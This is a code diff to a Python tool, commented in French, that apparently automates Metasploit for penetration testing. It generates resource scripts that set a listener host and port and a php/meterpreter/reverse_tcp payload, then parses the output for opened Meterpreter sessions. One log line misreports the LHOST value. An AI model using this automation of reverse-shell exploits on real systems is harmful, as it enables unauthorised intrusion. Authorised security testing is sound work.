@@ -960,11 +960,11 @@ set RPORT {port}
 """
         
         # ✅ CORRECTION UNIQUE: LHOST sur toutes interfaces pour éviter l'erreur de bind
-        script += f"set LHOST 172.20.0.2\n"  # Écouter sur toutes les interfaces
+        script += f"set LHOST 172.20.0.2\n"
         script += f"set LPORT {options.get('LPORT', '4444')}\n"
         
         # ✅ AMÉLIORATION: Log pour debug
-        logger.info(f"🔧 LHOST configuré sur 172.20.0.2")
+        logger.info(f"🔧 LHOST configuré sur 0.0.0.0")
         logger.info(f"🔧 LPORT configuré à: {options.get('LPORT', '4444')}")
         
         # ✅ GESTION SPÉCIALE POUR SSH EXPLOITS
@@ -991,7 +991,7 @@ set RPORT {port}
         elif 'http' in exploit_module.lower():
             if 'php_cgi_arg_injection' in exploit_module:
                 # Pour PHP CGI, on a besoin d'un payload PHP
-                payload = options.get('PAYLOAD', 'php/reverse_php')
+                payload = options.get('PAYLOAD', 'php/meterpreter/reverse_tcp')
                 script += f"set PAYLOAD {payload}\n"
                 
                 # Options spécifiques pour PHP CGI
@@ -1058,7 +1058,7 @@ sessions -l
         return script
     
     def _parse_exploit_output(self, output: str, module: str) -> Dict[str, Any]:
-        """Parse la sortie d'un exploit Metasploit"""
+        """Parse la sortie d'un exploit Metasploit - VERSION CORRIGÉE"""
         result = {
             'exploit_attempted': True,
             'sessions_opened': 0,
@@ -1069,32 +1069,81 @@ sessions -l
         
         lines = output.split('\n')
         
+        # Variables pour comptage précis
+        sessions_count = 0
+        exploit_successful = False
+        target_vulnerable = False
+        
         for line in lines:
-            line_lower = line.lower()
+            line_lower = line.lower().strip()
+            line_clean = line.strip()
             
-            # Détection de sessions ouvertes
-            if 'session' in line_lower and ('opened' in line_lower or 'created' in line_lower):
-                result['sessions_opened'] += 1
-                result['status'] = 'exploited'
+            # ✅ CORRECTION 1: Détecter les sessions RÉELLEMENT ouvertes
+            if 'meterpreter session' in line_lower and 'opened' in line_lower:
+                sessions_count += 1
+                exploit_successful = True
+                logger.info(f"🎯 Session Meterpreter détectée: {line_clean}")
             
-            # Détection de vulnérabilités
-            if any(keyword in line_lower for keyword in ['vulnerable', 'exploit completed', 'shell opened']):
-                result['vulnerabilities_found'].append(line.strip())
-                result['status'] = 'vulnerable'
+            # ✅ CORRECTION 2: Vérifier la liste des sessions actives
+            elif line.startswith('  ') and 'meterpreter' in line_lower:
+                # Format: "  1  meterpreter x86/linux  ..."
+                sessions_count += 1
+                exploit_successful = True
             
-            # Détection d'erreurs
-            if any(keyword in line_lower for keyword in ['error', 'failed', 'unable to']):
-                result['errors'].append(line.strip())
-            
-            # Détection d'échec d'exploitation
-            if any(keyword in line_lower for keyword in ['exploit failed', 'not vulnerable', 'target is not']):
+            # ✅ CORRECTION 3: Détecter les échecs explicites
+            elif 'not exploitable' in line_lower or 'not vulnerable' in line_lower:
                 result['status'] = 'not_vulnerable'
+                result['errors'].append(line_clean)
+                logger.info(f"🚫 Cible non vulnérable: {line_clean}")
+            
+            elif 'exploit completed, but no session was created' in line_lower:
+                result['status'] = 'exploit_failed'
+                result['errors'].append(line_clean)
+                logger.info(f"❌ Exploitation échouée: {line_clean}")
+            
+            elif 'no active sessions' in line_lower:
+                sessions_count = 0  # Force à 0 si confirmé
+                logger.info("🔍 Confirmation: Aucune session active")
+            
+            # ✅ CORRECTION 4: Détecter les succès réels
+            elif any(keyword in line_lower for keyword in [
+                'shell opened', 'command shell session', 'meterpreter session opened'
+            ]):
+                result['vulnerabilities_found'].append(line_clean)
+                target_vulnerable = True
+                exploit_successful = True
+            
+            # ✅ CORRECTION 5: Détecter les erreurs
+            elif any(keyword in line_lower for keyword in [
+                'error', 'failed', 'unable to', 'connection refused', 'timeout'
+            ]):
+                result['errors'].append(line_clean)
         
-        # Statut par défaut si pas de sessions mais pas d'erreurs
-        if result['status'] == 'unknown' and not result['errors']:
+        # ✅ CORRECTION 6: Déterminer le statut final basé sur les preuves
+        result['sessions_opened'] = sessions_count
+        
+        if sessions_count > 0:
+            result['status'] = 'exploited'
+            logger.info(f"✅ Exploitation réussie: {sessions_count} session(s)")
+        elif result['status'] == 'not_vulnerable':
+            # Déjà défini ci-dessus
+            logger.info("🚫 Cible confirmée non vulnérable")
+        elif result['status'] == 'exploit_failed':
+            # Déjà défini ci-dessus
+            logger.info("❌ Exploitation tentée mais échouée")
+        elif target_vulnerable:
+            result['status'] = 'vulnerable'
+            logger.info("⚠️ Cible vulnérable mais pas d'exploitation")
+        elif len(result['errors']) > 0:
+            result['status'] = 'error'
+            logger.info("🔧 Erreurs détectées pendant l'exploitation")
+        else:
             result['status'] = 'completed'
+            logger.info("ℹ️ Exploitation terminée sans résultat clair")
         
+        logger.info(f"📊 Résumé parsing: {sessions_count} sessions, statut: {result['status']}")
         return result
+
 
     def _parse_auxiliary_output(self, output: str, module: str) -> Dict[str, Any]:
         """Parse la sortie d'un module auxiliaire - VERSION CORRIGÉE POUR DIR_SCANNER"""
@@ -1499,24 +1548,24 @@ class HuntKitIntegration:
 
 
     def _create_exploitation_summary(self, result: Dict) -> str:
-        """Crée un résumé lisible des résultats d'exploitation"""
+        """Crée un résumé lisible des résultats d'exploitation - VERSION CORRIGÉE"""
         if not result.get('success'):
-            return f"Échec de l'exploitation: {result.get('error', 'Erreur inconnue')}"
+            return f"❌ Échec de l'exploitation: {result.get('error', 'Erreur inconnue')}"
         
         parsed = result.get('parsed_result', {})
+        sessions = parsed.get('sessions_opened', 0)
+        status = parsed.get('status', 'unknown')
         
-        if parsed.get('sessions_opened', 0) > 0:
-            return f"✅ Exploitation réussie ! {parsed['sessions_opened']} session(s) ouverte(s)"
-        
-        if parsed.get('credentials_found'):
-            creds_count = len(parsed['credentials_found'])
-            return f"🔑 {creds_count} credential(s) découvert(s)"
-        
-        if parsed.get('vulnerabilities_found'):
-            vuln_count = len(parsed['vulnerabilities_found'])
-            return f"⚠️ {vuln_count} vulnérabilité(s) détectée(s)"
-        
-        if parsed.get('status') == 'not_vulnerable':
-            return "✅ Cible non vulnérable à ce module"
-        
-        return "ℹ️ Exploitation terminée - voir détails"
+        # ✅ CORRECTION: Messages basés sur le statut réel
+        if sessions > 0:
+            return f"🎯 Exploitation réussie ! {sessions} session(s) ouverte(s)"
+        elif status == 'not_vulnerable':
+            return "🚫 Cible non vulnérable à ce module"
+        elif status == 'exploit_failed':
+            return "❌ Exploitation tentée mais échec (aucune session créée)"
+        elif status == 'vulnerable':
+            return "⚠️ Cible vulnérable mais exploitation incomplète"
+        elif status == 'error':
+            return "🔧 Erreurs détectées - voir les détails"
+        else:
+            return "ℹ️ Exploitation terminée - statut incertain"
